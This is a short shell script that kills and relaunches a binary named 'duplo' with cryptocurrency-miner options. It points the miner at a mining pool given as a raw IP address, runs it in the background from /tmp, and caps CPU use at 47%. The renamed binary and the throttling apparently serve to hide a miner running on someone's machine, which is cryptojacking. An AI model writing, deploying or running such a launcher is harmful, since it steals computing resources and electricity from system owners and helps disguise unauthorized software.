pkill duplo
sleep 7
duplo -o 116.203.53.211:47298 -u $WALLET --pass=$PASSWORD --rig-id=$ID -B -l /tmp/duplo/duplo.log --donate-level=1 --print-time=10 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=47 --av=1 --variant -1
echo -e 'ALL WORKS! tail -f /tmp/duplo/duplo.log'
